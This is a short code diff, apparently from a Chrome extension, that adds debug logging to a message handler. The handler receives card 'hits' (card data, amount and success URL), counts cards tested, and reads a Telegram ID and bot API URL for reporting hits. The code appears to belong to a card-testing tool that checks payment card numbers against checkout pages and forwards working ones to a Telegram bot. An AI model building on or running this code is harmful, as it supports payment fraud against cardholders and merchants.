@@ -307,8 +307,19 @@ chrome.runtime.onMessage.addListener((msg, sender, respond) => {
       broadcastToTabs({ type: 'STATS_UPDATE', attempts: state.stats.tested, hits: state.stats.hits }, sender?.tab?.id);
 
       // Debug logging for card data
-      console.log('[CARD_HIT] Card data received:', msg.card, 'Full msg:', msg);
+      console.log('[CARD_HIT] RECEIVED HIT DATA:', {
+        card: msg.card || 'NO_CARD_DATA',
+        amount: msg.amount || 'NO_AMOUNT_DATA',
+        success_url: msg.success_url || 'NO_URL_DATA',
+        attempts: state.stats.tested,
+        full_msg: msg
+      });
       chrome.storage.local.get(['ax_tg_id', 'ax_tg_name', 'ax_api_url', 'ax_auto_screenshot', 'ax_screenshot_tg', 'ax_tg_hits', 'ax_fill_email'], (r) => {
+        console.log('[CARD_HIT] Retrieved from storage:', {
+          ax_tg_id: r.ax_tg_id || 'NO_TG_ID',
+          ax_fill_email: r.ax_fill_email || 'NO_EMAIL',
+          ax_api_url: r.ax_api_url || 'NO_API_URL'
+        });
         const base = (r.ax_api_url || (typeof TGConfig !== 'undefined' ? TGConfig.BOT_URL : 'http://localhost:3000')).replace(/\/$/, '');
         if (!r.ax_tg_id || !base) {
           if (!r.ax_tg_id) chrome.storage.local.set({ ax_last_tg_notify_error: 'Telegram ID not set. Log in via OTP first.' });
